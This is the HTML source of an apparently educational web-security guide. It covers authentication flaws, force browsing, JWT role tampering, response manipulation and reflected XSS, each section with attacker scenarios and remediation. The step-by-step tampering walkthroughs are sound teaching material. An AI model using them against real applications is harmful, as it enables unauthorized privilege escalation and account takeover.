<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Web Security Best Practices | Build Better Web</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&family=Roboto:wght@300;400;500&display=swap" rel="stylesheet">
    <style>
        :root {
            --primary: #4361ee;
            --primary-dark: #3a56d4;
            --secondary: #7209b7;
            --accent: #f72585;
            --light: #f8f9fa;
            --dark: #212529;
            --gray: #6c757d;
            --light-gray: #e9ecef;
            --success: #4cc9f0;
            --warning: #f8961e;
            --danger: #f94144;
            --card-shadow: 0 10px 20px rgba(0,0,0,0.08);
            --transition: all 0.3s ease;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Roboto', sans-serif;
            line-height: 1.6;
            color: var(--dark);
            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
            background-attachment: fixed;
            display: flex;
            min-height: 100vh;
        }

        h1, h2, h3, h4, h5, h6 {
            font-family: 'Poppins', sans-serif;
            font-weight: 600;
            line-height: 1.3;
            margin-bottom: 1rem;
            color: var(--dark);
        }

        h1 {
            font-size: 2.5rem;
            background: linear-gradient(90deg, var(--primary), var(--secondary));
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            margin-bottom: 1.5rem;
        }

        h2 {
            font-size: 1.8rem;
            color: var(--primary-dark);
            padding-bottom: 0.5rem;
            border-bottom: 2px solid var(--light-gray);
            margin-top: 2rem;
        }

        h3 {
            font-size: 1.4rem;
            color: var(--secondary);
            margin-top: 1.5rem;
        }

        p {
            margin-bottom: 1.2rem;
        }

        a {
            color: var(--primary);
            text-decoration: none;
            transition: var(--transition);
        }

        a:hover {
            color: var(--secondary);
        }

        /* Sidebar Navigation */
        .sidebar {
            width: 300px;
            background: white;
            box-shadow: 2px 0 10px rgba(0, 0, 0, 0.1);
            padding: 2rem 1.5rem;
            overflow-y: auto;
            position: sticky;
            top: 0;
            height: 100vh;
        }

        .logo {
            display: flex;
            align-items: center;
            gap: 10px;
            margin-bottom: 2rem;
            padding-bottom: 1.5rem;
            border-bottom: 1px solid var(--light-gray);
        }

        .logo i {
            font-size: 1.8rem;
            color: var(--primary);
        }

        .logo-text {
            font-family: 'Poppins', sans-serif;
            font-weight: 700;
            font-size: 1.5rem;
            background: linear-gradient(90deg, var(--primary), var(--secondary));
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
        }

        .nav-title {
            font-size: 1.2rem;
            margin-bottom: 1.2rem;
            padding-bottom: 0.8rem;
            border-bottom: 1px solid var(--light-gray);
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .nav-title i {
            color: var(--primary);
        }

        .topic-list {
            list-style: none;
            margin: 0;
        }

        .topic-list li {
            margin-bottom: 0.8rem;
        }

        .topic-list a {
            display: flex;
            align-items: center;
            gap: 10px;
            padding: 0.8rem 1rem;
            border-radius: 8px;
            transition: var(--transition);
            color: var(--dark);
        }

        .topic-list a:hover, .topic-list a.active {
            background: var(--primary);
            color: white;
            transform: translateX(5px);
        }

        .topic-list i {
            font-size: 0.9rem;
            width: 20px;
            text-align: center;
        }

        .topic-list a.active i {
            color: white;
        }

        .tag-cloud {
            display: flex;
            flex-wrap: wrap;
            gap: 0.5rem;
            margin-top: 2rem;
        }

        .tag {
            background: var(--light);
            padding: 0.4rem 0.8rem;
            border-radius: 20px;
            font-size: 0.85rem;
            transition: var(--transition);
        }

        .tag:hover {
            background: var(--primary);
            color: white;
        }

        /* Main Content */
        .main-content {
            flex: 1;
            padding: 1rem;
            overflow-y: auto;
        }

        .blog-content {
            background: white;
            border-radius: 16px;
            box-shadow: var(--card-shadow);
            padding: 1.5rem;
            overflow: hidden;
            max-width: 1000px;
            margin: 0 auto;
        }

        .intro-section {
            text-align: center;
            margin-bottom: 2rem;
            padding-bottom: 1rem;
            border-bottom: 1px solid var(--light-gray);
        }

        .intro-section p {
            font-size: 1.1rem;
            color: var(--gray);
            max-width: 800px;
            margin: 0 auto;
        }

        .topic-card {
            background: white;
            border-radius: 12px;
            padding: 2rem;
            margin-bottom: 2rem;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.05);
            border-left: 4px solid var(--primary);
            transition: var(--transition);
            scroll-margin-top: 20px;
        }

        .topic-card:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
        }

        .topic-header {
            display: flex;
            align-items: center;
            gap: 10px;
            margin-bottom: 1.5rem;
        }

        .topic-icon {
            width: 40px;
            height: 40px;
            border-radius: 50%;
            background: var(--primary);
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-size: 1.2rem;
        }

        .info-box {
            background: var(--light);
            border-left: 4px solid var(--success);
            padding: 1.5rem;
            border-radius: 8px;
            margin: 1.5rem 0;
        }

        .warning-box {
            background: #f8d7da;
            border-left: 4px solid var(--danger);
            padding: 1.5rem;
            border-radius: 8px;
            margin: 1.5rem 0;
        }

        .attack-scenario-box {
            background: #fff3cd;
            border-left: 4px solid var(--warning);
            padding: 1.5rem;
            border-radius: 8px;
            margin: 1.5rem 0;
        }

/*        .danger-box {
            background: #f8d7da;
            border-left: 4px solid var(--danger);
            padding: 1.5rem;
            border-radius: 8px;
            margin: 1.5rem 0;
        } */

        .remediation-box {
            background: #d1ecf1;
            border-left: 4px solid var(--success);
            padding: 1.5rem;
            border-radius: 8px;
            margin: 1.5rem 0;
        }

        pre {
            background: #2d3748;
            color: #e2e8f0;
            padding: 1.5rem;
            border-radius: 8px;
            overflow-x: auto;
            margin: 1.5rem 0;
            font-family: 'Courier New', monospace;
            font-size: 0.9rem;
            line-height: 1.5;
        }

        code {
            background: #edf2f7;
            padding: 0.2rem 0.4rem;
            border-radius: 4px;
            font-family: 'Courier New', monospace;
            font-size: 0.9rem;
            color: var(--dark);
        }

        pre code {
            background: none;
            padding: 0;
            color: inherit;
        }

        ul, ol {
            margin-left: 1.5rem;
            margin-bottom: 1.5rem;
        }

        li {
            margin-bottom: 0.5rem;
        }

        /* Back to top button */
        .back-to-top {
            position: fixed;
            bottom: 2rem;
            right: 2rem;
            width: 50px;
            height: 50px;
            border-radius: 50%;
            background: var(--primary);
            color: white;
            display: flex;
            align-items: center;
            justify-content: center;
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
            cursor: pointer;
            transition: var(--transition);
            opacity: 0;
            visibility: hidden;
            z-index: 999;
        }

        .back-to-top.visible {
            opacity: 1;
            visibility: visible;
        }

        .back-to-top:hover {
            background: var(--primary-dark);
            transform: translateY(-3px);
        }

        /* Mobile menu button */
        .mobile-menu-btn {
            display: none;
            position: fixed;
            top: 1rem;
            left: 1rem;
            z-index: 1000;
            background: var(--primary);
            color: white;
            border: none;
            border-radius: 4px;
            width: 40px;
            height: 40px;
            font-size: 1.2rem;
            cursor: pointer;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.2);
        }

        /* Responsive Styles */
        @media (max-width: 992px) {
            body {
                flex-direction: column;
            }
            
            .sidebar {
                width: 100%;
                height: auto;
                position: fixed;
                top: 0;
                left: -100%;
                z-index: 999;
                transition: var(--transition);
                box-shadow: 2px 0 10px rgba(0, 0, 0, 0.1);
            }
            
            .sidebar.active {
                left: 0;
            }
            
            .main-content {
                margin-top: 0;
                padding: 1rem;
            }
            
            .blog-content {
                padding: 1.5rem;
            }
            
            .mobile-menu-btn {
                display: flex;
                align-items: center;
                justify-content: center;
            }
        }

        @media (max-width: 768px) {
            h1 {
                font-size: 2rem;
            }
            
            h2 {
                font-size: 1.6rem;
            }
            
            .topic-card {
                padding: 1.5rem;
            }
            
            .intro-section {
                margin-bottom: 2rem;
            }
        }

        /* Animation for topic cards */
        @keyframes fadeInUp {
            from {
                opacity: 0;
                transform: translateY(20px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .topic-card {
            animation: fadeInUp 0.5s ease forwards;
        }

        .topic-card:nth-child(2) { animation-delay: 0.1s; }
        .topic-card:nth-child(3) { animation-delay: 0.2s; }
        .topic-card:nth-child(4) { animation-delay: 0.3s; }
        .topic-card:nth-child(5) { animation-delay: 0.4s; }
        .topic-card:nth-child(6) { animation-delay: 0.5s; }
        .topic-card:nth-child(7) { animation-delay: 0.6s; }
        .topic-card:nth-child(8) { animation-delay: 0.7s; }
        .topic-card:nth-child(9) { animation-delay: 0.8s; }
    </style>
</head>
<body>
    <!-- Mobile Menu Button -->
    <button class="mobile-menu-btn">
        <i class="fas fa-bars"></i>
    </button>

    <!-- Sidebar Navigation -->
    <aside class="sidebar">
        <h3 class="nav-title"><i class="fas fa-list"></i> OWASP Security Topics</h3>
        <ul class="topic-list">
            <li><a href="#authentication" class="active"><i class="fas fa-chevron-right"></i>Authentication</a></li>
            <li><a href="#privilege-escalation-via-froce-browsing" class="active"><i class="fas fa-chevron-right"></i>Privilege Escalation Via Force Browsing</a></li>
            <li><a href="#privilege-escalation-via-backend" class="active"><i class="fas fa-chevron-right"></i>Privilege Escalation Via Backend</a></li>
            <li><a href="#privilege-escalation-via-response-manipulation" class="active"><i class="fas fa-chevron-right"></i>Privilege Escalation Via Response Manipulation</a></li>
            <li><a href="#reflected-cross-site-scripting" class="active"><i class="fas fa-chevron-right"></i>Reflected Cross-Site Scripting</a></li>
            <li><a href="#stored-cross-site-scripting" class="active"><i class="fas fa-chevron-right"></i>Stored Cross-Site Scripting</a></li>
            <li><a href="#dom-cross-site-scripting" class="active"><i class="fas fa-chevron-right"></i>DOM-based Cross-Site Scripting</a></li>                                         
            <li><a href="#sql-injection" class="active"><i class="fas fa-chevron-right"></i>SQL Injection</a></li>
            <li><a href="#html-injection" class="active"><i class="fas fa-chevron-right"></i>HTML Injection</a></li>
            <li><a href="#os-command-injection" class="active"><i class="fas fa-chevron-right"></i>OS Command Injection</a></li>
            <li><a href="#xpath-injection" class="active"><i class="fas fa-chevron-right"></i>XPath Injection</a></li>
            <li><a href="#xml-injection" class="active"><i class="fas fa-chevron-right"></i>XML External Entity (XXE) Injection</a></li>
            <li><a href="#ssi-injection" class="active"><i class="fas fa-chevron-right"></i>Server-Side Includes (SSI)</a></li>
            <li><a href="#server-side-request-forgery" class="active"><i class="fas fa-chevron-right"></i>Server-Side Request Forgery (SSRF)</a></li>
            <li><a href="#file-upload"><i class="fas fa-chevron-right"></i> File Upload Security</a></li>
            <li><a href="#local-file-inclusion"><i class="fas fa-chevron-right"></i> Local File Inclusion</a></li>
            <li><a href="#remote-file-inclusion"><i class="fas fa-chevron-right"></i> Remote File Inclusion</a></li>
            <li><a href="#directory-traversal"><i class="fas fa-chevron-right"></i> Directory Traversal</a></li>
            <li><a href="#cross-site-request-forgery" class="active"><i class="fas fa-chevron-right"></i>Cross-Site Request Forgery</a></li>
            <li><a href="#cross-origin-resource-sharing" class="active"><i class="fas fa-chevron-right"></i>Cross-Origin Resource Sharing</a></li>
            <li><a href="#http-splitting-and-smuggling" class="active"><i class="fas fa-chevron-right"></i>HTTP Splitting and Smuggling</a></li>
            <li><a href="#security-headers" class="active"><i class="fas fa-chevron-right"></i> Security Headers</a></li>
            <li><a href="#secure-cookies"><i class="fas fa-chevron-right"></i> Secure Cookies</a></li>
            <li><a href="#local-storage"><i class="fas fa-chevron-right"></i> Local Storage Security</a></li>
            <li><a href="#vulnerable-components"><i class="fas fa-chevron-right"></i> Vulnerable Components</a></li>
            <li><a href="#input-validation"><i class="fas fa-chevron-right"></i> Input Validation</a></li>
            <li><a href="#server-details"><i class="fas fa-chevron-right"></i> Server Information</a></li>
            <li><a href="#tls-security"><i class="fas fa-chevron-right"></i> TLS Security</a></li>
        </ul>
    </aside>

    <!-- Main Content -->
    <main class="main-content">
        <div class="blog-content">
            <div class="intro-section">
                <h1>Build Better Web</h1>
                <p>A comprehensive guide to implementing security best practices for modern web applications. Learn how to protect your applications from common vulnerabilities and build more secure software.</p>
            </div>

        <!-- Topic 1: Authentication -->
            <div id="authentication" class="topic-card">
                <div class="topic-header">
                    <div class="topic-icon">
                        <i class="fas fa-file-upload"></i>
                    </div>
                    <h2>1. Authentication</h2>
                </div>
                
                <h3>üìåAuthentication</h3>
                <p>Authentication vulnerabilities occur when login or identity verification mechanisms are weak or misconfigured. They can let attackers impersonate users, steal data, or take over accounts. The fix is strong password policies, multi-factor authentication, secure session handling, and regular monitoring.</p>
                <p>This occurs because the web application does not properly check user permissions before showing sensitive pages or data.</p>
                
                <div class="example-box">
                    <h3>üîë Types of Authentication Vulnerabilities</h3>
                    <p><b>Weak Passwords</b> ‚Äì Users choose simple or reused passwords that attackers can guess or brute-force.</p>
                    <p><b>Credential Stuffing</b> ‚Äì Attackers use stolen username/password pairs from other breaches to log in.</p>
                    <p><b>Brute Force Attacks</b> ‚Äì Automated attempts to guess passwords until successful.</p>
                    <p><b>Session Hijacking</b> ‚Äì Attackers steal session tokens/cookies to impersonate users.</p>
                    <p><b>Broken Authentication</b> ‚Äì Poor implementation of login, password reset, or session management.</p>
                    <p><b>Default Credentials</b> ‚Äì Systems shipped with default usernames/passwords (e.g., ‚Äúadmin/admin‚Äù).</p>
                    <p><b>Missing Multi-Factor Authentication (MFA)</b> ‚Äì Reliance only on passwords makes accounts easier to compromise.</p>
                </div>

                <div class="warning-box">
                    <h3>üí• Impact of the Issue</h3>
                    <p><b>Account Takeover</b> ‚Äì Attackers gain full access to user accounts.</p>
                    <p><b>Data Breach</b> ‚Äì Sensitive information (personal, financial, health data) is exposed.</p>
                    <p><b>Financial Loss </b>‚Äì Fraudulent transactions or ransom demands.</p>
                    <p><b>Reputation Damage </b> ‚Äì Loss of customer trust and regulatory penalties.</p>
                    <p><b>Regulatory Fines</b> ‚Äì Non-compliance with standards like GDPR, HIPAA, or PCI DSS.</p>
                </div>
                
                <div class="attack-scenario-box">
                    <h3>üé≠ Attacker Scenarios & Examples</h3>
                    <p><b>Credential Stuffing Attack:</b> An attacker uses leaked credentials from another site to log into a banking app.</p>
                    <p><b>Brute Force Attack:</b> Automated scripts try thousands of password combinations until they succeed.</p>
                    <p><b>Session Hijacking:</b> A hacker intercepts a session cookie over unsecured Wi-Fi and impersonates the user.</p>
                    <p><b>Phishing + Weak Authentication:</b> A user clicks a fake login link; without MFA, the attacker logs in easily.</p>
                    <p><b>Default Credentials Exploit:</b> IoT devices with unchanged factory passwords are taken over by botnets.</p>
                </div>

                <div class="remediation-box">
                    <h3>üõ†Ô∏è Remediation (How to Fix It)</h3>
                    <p><b>Strong Password Policies</b> ‚Äì Enforce complexity, length, and rotation.</p>
                    <p><b>Multi-Factor Authentication (MFA)</b> ‚Äì Add extra verification like SMS, authenticator apps, or biometrics.</p>
                    <p><b>Rate Limiting & Lockouts</b> ‚Äì Prevent brute-force attempts by limiting login retries.</p>
                    <p><b>Secure Session Management</b> ‚Äì Use HTTPS, regenerate session IDs, and set secure cookie flags.</p>
                    <p><b>Monitor & Alert</b> ‚Äì Detect unusual login attempts or geographic anomalies.</p>
                    <p><b>Disable Default Accounts</b> ‚Äì Remove or change default credentials immediately.</p> 
                    <p><b>Regular Security Testing</b> ‚Äì Penetration testing and vulnerability scans.</p>
                </div>
                                
                <h3>üîó Reference Links:</h3>
                <p><a href="https://brightsec.com/blog/broken-authentication-impact-examples-and-how-to-fix-it/">https://brightsec.com/blog/broken-authentication-impact-examples-and-how-to-fix-it/</a></p>
                <p><a href="https://www.strongdm.com/blog/authentication-vulnerabilities">https://www.strongdm.com/blog/authentication-vulnerabilities</a></p>
                <p><a href="https://www.geeksforgeeks.org/ethical-hacking/broken-authentication-vulnerability/">https://www.geeksforgeeks.org/ethical-hacking/broken-authentication-vulnerability/</a></p>
            </div>

            <!-- Topic 2: Privilege Escalation via Force Browsing -->
            <div id="privilege-escalation-via-froce-browsing" class="topic-card">
                <div class="topic-header">
                    <div class="topic-icon">
                        <i class="fas fa-file-upload"></i>
                    </div>
                    <h2>2. Privilege Escalation via Force Browsing</h2>
                </div>
                
                <h3>üìå Privilege Escalation via Force Browsing:</h3>
                <p>Privilege Escalation via Force Browsing happens when an attacker manually changes the URL or browses directly to a web page or resource that should 
                only be accessible to higher-privileged users (like admins).</p>
                <p>This occurs because the web application does not properly check user permissions before showing sensitive pages or data.</p>
                
                <div class="example-box">
                    <h3>Example:</h3>
                    <p>A normal user has access to:</p>
                    <pre>https://example.com/user/profile</pre>
                    <p>But the attacker tries:</p>
                    <pre>https://example.com/admin/dashboard</pre>
                    <p>If the application fails to verify that the user is an admin and shows the admin dashboard, that‚Äôs a Force Browsing privilege escalation vulnerability.</p>
                </div>

                <div class="warning-box">
                    <h3>üí• Impact of the Issue</h3>
                    <p><b>Unauthorized access: </b>Attackers can view or modify data not meant for them.</p>
                    <p><b>Privilege escalation: </b>Normal users can gain admin or manager privileges.</p>
                    <p><b>Data leakage: </b>Sensitive data (like financial, personal, or system configuration) may be exposed.</p>
                    <p><b>System compromise: </b>Attackers can perform administrative actions such as deleting users, changing roles, or accessing restricted resources.</p>
                </div>
                
                <div class="attack-scenario-box">
                    <h3>üß† Attacker Scenarios</h3>
                    <p>1. Attacker logs in as a regular user.</p>
                    <p>2. They inspect URLs of pages they can access (like /user/profile).</p>
                    <p>3. They guess or modify the URL to access a restricted area (like /admin/settings).</p>
                    <p>4. If the server does not validate the user‚Äôs access rights, the attacker successfully reaches the admin area.</p>
                    <p>5. The attacker can now change system settings, steal data, or delete users ‚Äî effectively escalating privileges.</p>
                </div>

                <div class="remediation-box">
                    <h3>üõ†Ô∏è Remediation (How to Fix It)</h3>
                    <p>1. Implement proper access control checks on every page and API endpoint ‚Äî not just on the user interface.</p>
                    <p>2. Use role-based access control (RBAC) to verify user roles before granting access.</p>
                    <p>3. Avoid relying on hidden URLs or client-side restrictions (e.g., hiding admin links from regular users).</p>
                    <p>4. Return 403 Forbidden or redirect when unauthorized access is attempted.</p>
                    <p>5. Regularly test your application for access control issues using tools or manual penetration testing.</p>
                    <p>6. Log and monitor unauthorized access attempts to detect force-browsing attacks.</p>    
                </div>
                                
                <h3>üîó Reference Links:</h3>
                <p><a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control">https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control</a></p>
                <p><a href="https://sudip-says-hi.medium.com/missing-function-level-access-control-a773990d8a63">https://sudip-says-hi.medium.com/missing-function-level-access-control-a773990d8a63</a></p>
                <p><a href="https://www.geeksforgeeks.org/computer-networks/how-to-prevent-broken-access-control/">https://www.geeksforgeeks.org/computer-networks/how-to-prevent-broken-access-control/</a></p>
            </div>

            <!-- Topic 3: Privilege Escalation via Force Browsing -->
            <div id="privilege-escalation-via-backend" class="topic-card">
                <div class="topic-header">
                    <div class="topic-icon">
                        <i class="fas fa-file-upload"></i>
                    </div>
                    <h2>3. Privilege Escalation Via Backend Session Tokens</h2>
                </div>
                
                <h3>üß© Privilege Escalation via Backend Session Cookie or Authorization Token Modification:</h3>
                <p>This vulnerability occurs when an attacker modifies or forges a session cookie or authorization token (like a JWT) to gain unauthorized access or higher privileges in a web application.</p>
                <p>In many web apps, users are identified and authorized using cookies or tokens stored in the browser. If these tokens are not securely protected or validated, attackers can edit or replace them to impersonate another user or escalate their privileges (e.g., become an admin).</p>
                
                <div class="example-box">
                    <h3>Example:</h3>
<pre>
// Normal JWT (base64 decoded)
{
"user": "john",
"role": "user"
}
</pre>
<p>If an attacker changes it to:</p>
<pre>
{
"user": "john",
"role": "admin"
}
</pre>
                
                <p>and the backend does not properly verify the token signature or role, the attacker gains admin access.</p>
                <h3>‚úÖ Correct:</h3>
                    <p>Token is signed by the server with a secret key.</p>
                    <p>Backend checks user‚Äôs actual role in the database before granting access.</p>
                <h3>‚ùå Vulnerable:</h3>
                <p>Token contains "role": "admin" and the backend trusts this without checking or validating the signature. </p>
                </div>

                <div class="warning-box">
                    <h3>üí• Impact of the Issue</h3>
                    <p><b>Unauthorized access: </b>Attackers can access protected data or admin dashboards.</p>
                    <p><b>Privilege escalation: </b>Regular users can perform admin-level actions.</p>
                    <p><b>Data Theft or Tampering: </b>Attackers can modify, delete, or steal sensitive information.</p>
                    <p><b>Account Takeover: </b>If sessions or tokens can be reused or stolen, attackers can act as other users.</p>
                    <p><b>Business Damage: </b>Leads to data breaches, system misuse, and loss of user trust.</p>
                </div>
                
                <div class="attack-scenario-box">
                    <h3>üß† Attacker Scenarios</h3>
                    <p>1. The attacker logs in as a normal user and gets a valid session cookie or JWT token.</p>
                    <p>2. They inspect or decode the token (e.g., using jwt.io).</p>
                    <p>3. They modify the token values such as:</p>
                    <p><b>Change "role": "user" ‚Üí "role": "admin", or</b></p>
                    <p><b>Replace "user_id": "1002" ‚Üí "user_id": "1001".</b></p>
                    <p>4. They re-encode the token and send it in their browser request.</p>
                    <p>5. If the backend does not properly verify the token‚Äôs signature or trusts the client-provided role, the attacker successfully performs admin actions.</p>
                </div>

                <div class="remediation-box">
                    <h3>üîí Remediation (How to Fix It)</h3>
                    <p><b>1. Server-side Authorization Check:</b> Always verify the user‚Äôs privileges on the backend before granting access.</p>
                    <b>2. Use Securely Signed Tokens:</b>
                    <p>Sign JWTs using strong algorithms (e.g., HS256, RS256) and always verify signatures on the server.</p>
                    <p>Never accept unsigned tokens (alg: none vulnerability).</p>
                    <b>3. Avoid Storing Roles or Permissions in Modifiable Tokens:</b>
                    <p>Keep roles and permissions server-side.</p>
                    <p>Use the token only as a reference (like a session ID).</p>
                    <p><b>4. Implement Role-Based Access Control (RBAC):</b> Check user roles and permissions on each request server-side.</p>
                    <p><b>5. Use Secure Cookies:</b> Add HttpOnly, Secure, and SameSite flags to prevent cookie theft.</p>
                    <p><b>6. Short Token Lifetimes & Revocation:</b> Use short-lived tokens and refresh tokens where needed.</p>    
                    <p><b>7. Input Validation:</b> Reject any modified, expired, or invalid tokens.</p>
                    <p><b>8. Monitor & Log:</b> Track token validation failures and suspicious login activity.</p>
                </div>
                                
                <h3>üìö Reference Links:</h3>
                <p><a href="https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html">https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html</a></p>
                <p><a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/</a></p>
                <p><a href="https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html">https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html</a></p>
                <p><a href="https://auth0.com/learn/json-web-tokens">https://auth0.com/learn/json-web-tokens</a></p>
            </div>

            <!-- Topic 4: Privilege Escalation via Force Browsing -->
            <div id="privilege-escalation-via-response-manipulation" class="topic-card">
                <div class="topic-header">
                    <div class="topic-icon">
                        <i class="fas fa-file-upload"></i>
                    </div>
                    <h2>4. Privilege Escalation via Response Manipulation</h2>
                </div>
                
                <h3>üß© Privilege Escalation via Response Manipulation:</h3>
                <p>Privilege Escalation via Response Manipulation happens when an attacker modifies or tampers with a server‚Äôs response (for example, JSON or HTML data sent to the browser) to gain higher privileges or unauthorized access within a web application.</p>
                <p>In this attack, the web application trusts client-side information (like data from responses) to control user privileges or access levels ‚Äî instead of validating permissions on the server.</p>
                
                <div class="example-box">
                    <h3>Example:</h3>
                    <p>A web API returns this JSON after login:</p>
<pre>
// Normal JWT (base64 decoded)
{
  "username": "user1",
  "role": "user",
  "isAdmin": false
}
</pre>
<p>If the attacker changes it (using tools like Burp Suite or browser dev tools) to:</p>
<pre>
{
  "username": "user1",
  "role": "admin",
  "isAdmin": true
}
</pre>
                
                <p>and the web app allows admin actions based on this manipulated data, the attacker can escalate privileges.</p>
                <h3>‚ùå Vulnerable design:</h3>
                <p>Frontend checks if isAdmin = true to show admin options ‚Äî no server validation.</p>
                <h3>‚úÖ Secure design:</h3>
                <p>The frontend just displays the UI. When an admin action is requested, the backend verifies the user‚Äôs role in the database before allowing it.</p>
                </div>

                <div class="warning-box">
                    <h3>üí• Impact of the Issue</h3>
                    <p><b>Unauthorized access: </b>Attackers can access admin pages or restricted features.</p>
                    <p><b>Privilege escalation: </b>Normal users can perform admin-level actions.</p>
                    <p><b>Data modification or theft: </b>Attackers can change, delete, or steal sensitive data.</p>
                    <p><b>Service disruption: </b>Admin-only features can be misused to harm the system.</p>
                    <p><b>Compliance risks: </b>Exposure of personal or confidential data can lead to legal issues.</p>
                </div>
                
                <div class="attack-scenario-box">
                    <h3>üß™ Attacker Scenarios</h3>
                    <p>1. The attacker logs in as a normal user.</p>
                    <p>2. The application‚Äôs backend sends a response like:</p>
<pre>
{"username": "alex", "role": "user"}
</pre>
                    <p>3. The attacker intercepts this response using a proxy tool (like Burp Suite) or browser Developer Tools.</p>
                    <p>4. The attacker modifies the response to:</p>
<pre>
{"username": "alex", "role": "admin"}
</pre>
                    <p>5. The frontend UI now displays admin features because it trusts the modified response.</p>
                    <p>6. The attacker uses these features to access sensitive data or perform administrative operations.</p>
                    <p>7. If the server doesn‚Äôt recheck permissions when processing requests, the attacker succeeds in privilege escalation.</p>
                </div>

                <div class="remediation-box">
                    <h3>üîí Remediation (How to Fix It)</h3>
                    <p><b>1. Enforce server-side authorization checks:</b> Always verify user permissions on the backend before performing any action.</p>
                    <p><b>2. Never trust client-side data:</b> Do not rely on values (like isAdmin or role) received from the frontend or stored in responses.</p>
                    <p><b>3. Use proper authentication and access control:</b> Implement Role-Based Access Control (RBAC) or Attribute-Based Access Control (ABAC) on the server.</p>
                    <p><b>4. Secure all responses:</b> Send only necessary data in responses ‚Äî avoid sending sensitive role or permission info to the client.</p>
                    <p><b>5. Use HTTPS/TLS:</b> Protect communication from being intercepted or modified during transit.</p>
                    <p><b>6. Implement integrity checks:</b> Validate the integrity of responses or use signed tokens (like JWTs with verified signatures).</p>    
                    <p><b>7. Log and monitor abnormal actions:</b> Record unauthorized access attempts or unusual role changes.</p>
                </div>
                                
                <h3>üìö Reference Links:</h3>
                <p><a href="https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Cheat_Sheet.html">https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Cheat_Sheet.html</a></p>
                <p><a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/">https://owasp.org/Top10/A01_2021-Broken_Access_Control/</a></p>
                <p><a href="https://cheatsheetseries.owasp.org/cheatsheets/Transport_Layer_Security_Cheat_Sheet.html">https://cheatsheetseries.owasp.org/cheatsheets/Transport_Layer_Security_Cheat_Sheet.html</a></p>
            </div>


        <!-- Topic 5: Reflected Cross-Site Scripting -->
            <div id="reflected-cross-site-scripting" class="topic-card">
                <div class="topic-header">
                    <div class="topic-icon">
                        <i class="fas fa-file-upload"></i>
                    </div>
                    <h2>5. Reflected Cross-Site Scripting</h2>
                </div>
                
                <h3>üß© Reflected Cross-Site Scripting (Reflected XSS):</h3>
                <p>Reflected XSS (Cross-Site Scripting) happens when a web application immediately ‚Äúreflects‚Äù (shows back) user input (like URL parameters or form data) in a webpage without properly validating or escaping it.</p>
                <p>This allows an attacker to inject malicious JavaScript code into the victim‚Äôs browser ‚Äî usually through a crafted URL.</p>
                
                <div class="example-box">
                    <h3>Example:</h3>
                    <p>Let‚Äôs say a website has a search feature:</p>
<pre>
https://example.com/search?query=apple
</pre>
<p>and the site displays:</p>
<pre>
Results for "apple"
</pre>
<p>If the application doesn‚Äôt sanitize input properly, an attacker could craft a URL like:</p>
<img src="Images/Reflected XSS-1.png" width="100%" height="auto">
<p>When a victim clicks this link, the site responds:</p>
<img src="Images/Reflected XSS-2.png" width="100%" height="auto">
<p>‚û°Ô∏è The browser executes the script, showing an alert ‚Äî or worse, running attacker code in the victim‚Äôs session.</p>

                <div class="warning-box">
                    <h3>üí• Impact of the Issue</h3>
                    <p><b>Session hijacking:</b> Stealing cookies or tokens.</p>
                    <p><b>Account takeover:</b> Using stolen credentials.</p>
                    <p><b>Phishing attacks:</b> Redirecting users to fake pages.</p>
                    <p><b>Defacement:</b> Modifying displayed content.</p>
                    <p><b>Malware distribution:</b> Injecting scripts that download malicious files.</p>
                </div>
                <p>Severity varies with what the attacker can access (sensitive pages, privileged actions, cookies not protected by HttpOnly, etc.).</p>
                
                <div class="attack-scenario-box">
                    <h3>üí£ Attacker scenario</h3>
                    <p>1. Attacker finds a page that reflects a parameter into HTML (e.g., search, error message, redirect).</p>
                    <p>2. Attacker crafts a malicious URL:</p>
                    <img src="Images/Reflected XSS-3.png" width="100%" height="auto">
                    <p>3. Victim clicks the link (phishing email, chat, forum).</p>
                    <p>4. The site responds with the q value inserted into the page without proper escaping.</p>
                    <p>5. The browser executes the script in the context of victim.com.</p>
                    <p>6. Attacker receives the victim‚Äôs cookies or triggers actions (change password, transfer funds, etc.).</p>
                    <p><b>Variant:</b> Script delivered inside an attribute, event handler, or in a URL used by the page ‚Äî context matters for payloads.</p>
                </div>

                <div class="remediation-box">
                    <h3>üõ†Ô∏è Remediation (How to Fix It)</h3>
                    <b>1. Escape output properly</b>
                    <p>Encode user input before rendering it in HTML, JavaScript, or attributes.</p>
                    <p>Example: convert "<" to "&lt", > to "&gt", etc.</p>
                    <b>2. Validate and sanitize inputs</b>
                    <p>Reject or filter unexpected characters in parameters.</p>
                    <b>3. Use a security framework</b>
                    <p>Use libraries or templating engines that automatically escape data (e.g., React, Angular, Django templates).</p>
                    <b>4. Implement Content Security Policy (CSP)</b>
                    <p>Restrict what JavaScript can run on the page.</p>
                    <b>5. Use modern frameworks</b>
                    <p>Frameworks like React, Vue, and Angular help mitigate XSS by default escaping.</p>
                </div>
                                
